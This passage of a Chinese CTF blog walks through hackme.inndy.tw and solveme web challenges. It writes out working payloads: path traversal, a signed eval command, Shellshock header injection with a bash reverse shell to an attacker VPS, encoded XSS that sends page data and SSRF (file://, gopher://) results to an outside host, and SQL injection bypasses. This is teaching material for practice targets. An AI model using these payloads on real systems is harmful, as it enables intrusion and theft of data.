(!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]); if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); $fname = get_abs_item($dir, $item); if (!file_in_web($fname)) show_error($GLOBALS[\"error_msg\"][\"accessfile\"]); if (isset($GLOBALS['__POST'][\"dosave\"]) &amp;&amp; $GLOBALS['__POST'][\"dosave\"] == \"yes\") &#123; $item = basename(stripslashes($GLOBALS['__POST'][\"fname\"])); $fname2 = get_abs_item($dir, $item); if (!isset($item) || $item == \"\") show_error($GLOBALS[\"error_msg\"][\"miscnoname\"]); if ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"itemdoesexist\"]); savefile($dir, $fname2); $fname = $fname2; &#125; $fp = @fopen($fname, \"r\"); if ($fp === false) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"openfile\"]); $s_item = get_rel_item($dir, $item); if (strlen($s_item) &gt; 50) $s_item = \"...\" . substr($s_item, -47); show_header($GLOBALS[\"messages\"][\"actedit\"] . \": /\" . $s_item); 函数中有三条过滤 123if (($GLOBALS[\"permissions\"] &amp; 01) != 01) show_error($GLOBALS[\"error_msg\"][\"accessfunc\"]);if (!get_is_file($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"fileexist\"]);if (!get_show_item($dir, $item)) show_error($item . \": \" . $GLOBALS[\"error_msg\"][\"accessfile\"]); 第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下 123456789101112131415161718function get_show_item($dir, $item) &#123; if ($item == \".\" || $item == \"..\") return false; if ($_COOKIE['help'] == 'me') &#123; $_COOKIE['help'] = null; setcookie('help', '', time() - 9999999999); echo '&lt;script&gt;alert(\"Very good. You know how to create cookie. How about tamper a cookie?\")&lt;/script&gt;'; &#125; if (empty($_COOKIE['show_hidden'])) &#123; setcookie('show_hidden', 'no', time() + 3600); &#125; if (substr($item, 0, 1) == \".\" &amp;&amp; $GLOBALS[\"show_hidden\"] == false &amp;&amp; $_COOKIE['show_hidden'] != 'yes') return false; if ($GLOBALS[\"no_access\"] != \"\" &amp;&amp; @eregi($GLOBALS[\"no_access\"], $item)) return false; if ($GLOBALS[\"show_hidden\"] == false) &#123; $dirs = explode(\"/\", $dir); foreach ($dirs as $i) if (substr($i, 0, 1) == \".\") return false; &#125; return true;&#125; 题目仅仅对$item进行了简单的过滤， if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false; ，那么我们可以考虑用目录穿越 ../../ 绕过 那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes） 1https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en 于是可以读到目标文件 然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 how do you turn this on ，登录即可读取flag dafuq-manager 3 题目给出了信息 For flag3, you need a shell to get that. see $WEBROOT/flag3! 这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 eval ，在fun_debug.php中发现存在该函数，跟进一下 1234567891011121314151617181920function do_debug() &#123; assert(strlen($GLOBALS['secret_key']) &gt; 40); $dir = $GLOBALS['__GET']['dir']; if (strcmp($dir, \"magically\") || strcmp($dir, \"hacker\") || strcmp($dir, \"admin\")) &#123; show_error('You are not hacky enough :('); &#125; list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2); $cmd = base64_decode($cmd); $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',); foreach ($bad_things as $bad) &#123; if (stristr($cmd, $bad)) &#123; die('2bad'); &#125; &#125; if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]), $hmac)) &#123; die(eval($cmd)); &#125; else &#123; show_error('What does the fox say?'); &#125;&#125; 对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数 1234function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, $GLOBALS[\"secret_key\"]); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125; 所以我们可以自己生成command 1234567&lt;?php function make_command($cmd) &#123; $hmac = hash_hmac('sha256', $cmd, \"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3\"); return sprintf('%s.%s', base64_encode($cmd), $hmac);&#125;var_dump(make_command('$a=\\'sys\\';$b=\\'tem\\';$c=$a.$b;$c(base64_decode(\\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\\'));'));?&gt; 注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下 1https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en 做完后感觉自己好菜呀，这代码审计的我晕头转向，233333… wordpress 1 WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 wp-content/plugins/core.php 中发现了一段代码 1234567891011function print_f14g()&#123; $h = 'm'.sprintf('%s%d','d',-4+9e0); if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') &#123; if(wp_get_user_ip() === '127.0.0.1') &#123; eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT))); &#125; else &#123; die('&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'); &#125; &#125;&#125; 我们把代码中的md5解密一下发现是 cat flag，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问 1https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag 查看元素即可找到flag wordpress 2 随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句 1&lt;!-- debug:&lt;?php var_dump($wp_query-&gt;post-&gt;&#123;'post_'.(string)($_GET['debug']?:'type')&#125;); ?&gt; --&gt; 看到query，应该是在搜索页面，所以我们提交的payload应该为 1https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content command-executor 随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件 1https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index base64解码一下得到源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php$pages = [ ['man', 'Man'], ['untar', 'Tar Tester'], ['cmd', 'Cmd Exec'], ['ls', 'List files'],];function fuck($msg) &#123; header('Content-Type: text/plain'); echo $msg; exit;&#125;$black_list = [ '\\/flag', '\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;'];function waf($a) &#123; global $black_list; if(is_array($a)) &#123; foreach($a as $key =&gt; $val) &#123; waf($key); waf($val); &#125; &#125; else &#123; foreach($black_list as $b) &#123; if(preg_match(\"/$b/\", $a) === 1) &#123; fuck(\"$b detected! exit now.\"); &#125; &#125; &#125;&#125;waf($_SERVER);waf($_GET);waf($_POST);function execute($cmd, $shell='bash') &#123; system(sprintf('%s -c %s', $shell, escapeshellarg($cmd)));&#125;foreach($_SERVER as $key =&gt; $val) &#123; if(substr($key, 0, 5) === 'HTTP_') &#123; putenv(\"$key=$val\"); &#125;&#125;$page = '';if(isset($_GET['func'])) &#123; $page = $_GET['func']; if(strstr($page, '..') !== false) &#123; $page = ''; &#125;&#125;if($page &amp;&amp; strlen($page) &gt; 0) &#123; try &#123; include(\"$page.php\"); &#125; catch (Exception $e) &#123; &#125;&#125;?&gt; 题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 CVE-2014-6271(破壳（shellsock）漏洞) ，在freebuf中有一个链接 http://www.freebuf.com/articles/system/45390.html 国外有一个漏洞利用的文章， https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php 但是直接利用会被waf掉，所以我们要考虑绕过正则 1&#39;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#39; 题目的正则中 :; 是存在漏洞的，我们可以用 : ; 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 \\/flag 我们可以利用通配符绕过， 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 但是并没有出现flag，发现是因为只有root才有文件的读权限 但是题目中有一个flag-reader文件，我们尝试读取一下 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 123456789101112131415161718192021222324252627282930313233include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123; char buff[4096], rnd[16], val[16]; if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123; write(1, \"Not enough random\\n\", 18); &#125; setuid(1337); seteuid(1337); alarm(1); write(1, &amp;rnd, sizeof(rnd)); read(0, &amp;val, sizeof(val)); if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123; int fd = open(argv[1], O_RDONLY); if(fd &gt; 0) &#123; int s = read(fd, buff, 1024); if(s &gt; 0) &#123; write(1, buff, s); &#125; close(fd); &#125; else &#123; write(1, \"Can not open file\\n\", 18); &#125; &#125; else &#123; write(1, \"Wrong response\\n\", 16); &#125;&#125; 代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell 1wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot; 又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag 1flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content 1cat content xssme 先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下 1&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt; 回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做 然后在自己的ceve账号中收到回显 xssrf leak 上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显 Admin only allowed from localhost, but you came from 192.168.123.1 修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法 1&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt; 但是遭到了过滤，我们可以考虑用HTML实体编码绕过 1&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt; 果然可以收到payload，base64解码一下再保存为html格式打开 send request功能有个request.php，尝试读取该页面 123456789101112&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 编码一下 1&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt; 然后在vps上即可收到base64字符串，解码 这应该就是题目的利用位置，我们尝试读config.php文件 12345678910111213&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);&quot;&gt; 编码发送，果然可以收到flag xssrf redis 题目漏洞点在于gopher未授权访问 12345678910111213&lt;svg&#x2F;onload&#x3D;&quot;xmlhttp&#x3D;new XMLHttpRequest();xmlhttp.onreadystatechange&#x3D;function()&#123; if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200) &#123; document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);&quot;&gt; 发现有flag，读取之 1xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;); 然后处理一下即可得到flag","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"Solveme题解","slug":"solveme","date":"2018-07-31T01:59:41.000Z","updated":"2018-08-06T03:46:09.371Z","comments":true,"path":"2018/07/31/solveme/","link":"","permalink":"http://chaosec.top/2018/07/31/solveme/","excerpt":"前言 最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下","text":"前言 最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下 Warm up 逆向跑一遍即可 1234&lt;?php $flag = '1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=';echo hex2bin(strrev(bin2hex(base64_decode($flag))));?&gt; Bad compare 这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦 Winter sleep 利用PHP的数字解析漏洞，payload 1?time&#x3D;6e6 Hard login 这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 curl，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以 1curl http:&#x2F;&#x2F;hardlogin.solveme.peng.kr&#x2F;index.php URL filtering 分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 do_you_want_flag,value中不能出现 yes，但是再获取flag时又要求必须是 do_you_want_flag=yes，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话 对严重不合格的 URL，parse_url() 可能会返回 FALSE。 所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload 1http:&#x2F;&#x2F;urlfiltering.solveme.peng.kr&#x2F;&#x2F;&#x2F;?do_you_want_flag&#x3D;yes Hash collision 直接数组绕过 1?foo[]&#x3D;1&amp;bar[]&#x3D;2 Array2String 题目核心在于提交 15th_HackingCamp对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述 Note that if the number is higher than 256, it will return the number mod 256. 就是说如果数字大于256的话它会自动取模，所以就简单了 1http:&#x2F;&#x2F;array2string.solveme.peng.kr&#x2F;index.php?password&#x3D;simple_passw0rd&amp;value[]&#x3D;305&amp;value[]&#x3D;309&amp;value[]&#x3D;372&amp;value[]&#x3D;360&amp;value[]&#x3D;351&amp;value[]&#x3D;328&amp;value[]&#x3D;353&amp;value[]&#x3D;355&amp;value[]&#x3D;363&amp;value[]&#x3D;361&amp;value[]&#x3D;366&amp;value[]&#x3D;359&amp;value[]&#x3D;323&amp;value[]&#x3D;353&amp;value[]&#x3D;365&amp;value[]&#x3D;368 Flag not found Give me a link 2 1234567891011121314151617181920if(isset($_GET['url']))&#123; $url = $_GET['url'];if(preg_match('/_|\\s|\\0/', $url))&#123; die('Not allowed character');&#125;$parse = parse_url($url); if(!preg_match('/^https?$/i', $parse['scheme']))&#123; die('Not allowed scheme');&#125;if(!preg_match('/^(localhost|127\\.\\d+\\.\\d+\\.\\d+|[^.]+)(\\:\\d+)?$/i', $parse['host']))&#123; die('Not allowed host');&#125;if(!preg_match('/\\/plz_give_me$/', $parse['path']))&#123; die('Not allowed path');&#125;&#125; 分析代码，题目过滤了几个条件 1、 url中不能出现 _ 以及其他不可见字符2、 path字段中又必须出现 plz_give_me 字段3、 限制输入的网址必须是 localhost 或 127.x.x.x 这种类型的网址 1和2冲突，可以用前面一题的方法绕过之对于第三个，有个绕过方法就是 ip2long() 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤 所以最终payload为 1https:&#x2F;&#x2F;givemealink2.solveme.peng.kr&#x2F;?url&#x3D;https:num_ip:12580&#x2F;plz%0agive%0ame Give me a link 关键代码如下 1234567891011121314if(preg_match('/_|\\s|\\0/', $url))&#123; die('Not allowed character'); &#125; if(!preg_match('/^https?\\:\\/\\/'.$_SERVER['HTTP_HOST'].'/i', $url))&#123; die('Not allowed URL'); &#125; $parse = parse_url($url); if($parse['path'] !== '/plz_give_me')&#123; die('Not allowed path'); &#125; curl_setopt($ch, CURLOPT_URL, $parse['scheme'].'://'.$parse['host'].'/'.$flag); 第一个和第三个的条件矛盾，具体参见前文，其中 $_SERVER[&#39;HTTP_HOST&#39;] 又和 curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag); 矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知 $url = ‘http://username:password@hostname/path?arg=value#anchor‘; 这样的方式也可以解析url，所以构造 1http:&#x2F;&#x2F;givemealink.solveme.peng.kr&#x2F;?url&#x3D;http:&#x2F;&#x2F;givemealink.solveme.peng.kr@ip_addr&#x2F;plz%1agive%1ame 注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：） Replace filter 关键代码如下 12345678910if(isset($_GET['say']) &amp;&amp; strlen($_GET['say']) &lt; 20)&#123; $say = preg_replace('/^(.*)flag(.*)$/', '$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;', $_GET['say']); if(preg_match('/give_me_the_flag/', $say))&#123; echo $flag; &#125;else&#123; echo 'What the f**k?'; &#125;&#125; 这里看学长的博客get到了新姿势，这个题目绕过的点在 .* 这里，这个可以匹配任意字符，但是不可以匹配换行，而 ^$ 又限制了字符串必须在同一行，所以绕过就简单了，payload 1http:&#x2F;&#x2F;replacefilter.solveme.peng.kr&#x2F;?say&#x3D;%0agive_me_the_flag Hell JS Anti SQLi 关键过滤如下 12345678910preg_match( '/\\.|\\`|\"|\\'|\\\\|\\xA0|\\x0B|0x0C|\\t|\\r|\\n|\\0|'. '=|&lt;|&gt;|\\(|\\)|@@|\\|\\||&amp;&amp;|#|\\/\\*.*\\*\\/|--[\\s\\xA0]|'. '0x[0-9a-f]+|0b[01]+|x\\'[0-9a-f]+\\'|b\\'[01]+\\'|'. '[\\s\\xA0\\'\"]+(as|or|and|r*like|regexp)[\\s\\xA0\\'\"]+|'. 'union[\\s\\xA0]+select|[\\s\\xA0](where|having)|'. '[\\s\\xA0](group|order)[\\s\\xA0]+by|limit[\\s\\xA0]+\\d|'. 'information_schema|procedure\\s+analyse\\s*/is', $id.','.$pw ) and die('Hack detected'); sql语句即判断条件1234567891011121314151617$result = mysqli_fetch_array( mysqli_query( $con, \"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');\" ) ); mysqli_close($con); if(isset($result))&#123; if($result['no'] === '31337')&#123; echo $flag; &#125;else&#123; echo 'Hello, ', $result['id']; &#125; &#125;else&#123; echo 'Login failed'; &#125; 该正则匹配中 |\\\\| 是无法匹配到 \\ 的，必须要用四个才可以，所以这道题目中 \\ 是可以用的，用 id=\\ 可以成功吃掉一个引号。正则中 union[\\s\\xA0]+select 还可考虑用 union all select 绕过，正则 --[\\s\\xA0] ，其中查资料发现 \\s :匹配任何不可见字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v] 也就是说还有其它字符可以匹配，例如 %01,%11,%02 ，基于以上内容可以构造payload 1?id&#x3D;1\\&amp;pw&#x3D;union all select 1222,212,12 from antisqli--%10 最终payload 1?id&#x3D;1\\&amp;pw&#x3D;union all select 31337,2,3 from antisqli--%10 Name Check 关键过滤如下 1if(preg_match(\"/admin|--|;|\\(\\)|\\/\\*|\\\\0/i\", $name)) 1234567891011121314151617181920$res = $sql-&gt;query(\" SELECT MAX('0','1','&#123;$name&#125;') LIKE 'a%', INSTR('&#123;$name&#125;','d')&gt;0, MIN('&#123;$name&#125;','b','c') LIKE '__m__', SUBSTR('&#123;$name&#125;',-2)='in' ;\"); if($res === false)&#123; echo 'Database error'; goto quit; &#125; $row = $res-&gt;fetchArray(SQLITE3_NUM); if( $row[0] + $row[1] + $row[2] + $row[3] !== 4 || array_sum($row) !== 4 )&#123; echo 'Auth failed'; goto quit; &#125; echo $flag; 看代码可知题目应该是要求四个选择条件都成立，按照题目要求应该就是输入admin才可以，但是题目过滤了admin，查阅sqlite发现，它在连接字符串的时候用的是 || 而不是 + ，所以payload： ?name=ad&#39;||&#39;min I am slowly 12345678910111213141516171819202122232425262728if(isset($answer))&#123; $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname) or die('SQL server down'); $result = mysqli_fetch_array( mysqli_query($con, \"SELECT `count` FROM `&#123;$table&#125;`;\") ); if(!isset($result))&#123; mysqli_query($con, \"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);\"); $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand())); mysqli_query($con, \"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);\"); &#125;elseif($result['count'] === '12')&#123; mysqli_query($con, \"DROP TABLE `&#123;$table&#125;`;\"); echo 'Game over'; goto quit; &#125; $randtime = mt_rand(1, 10); $result = mysqli_fetch_array( mysqli_query($con, \"SELECT * FROM 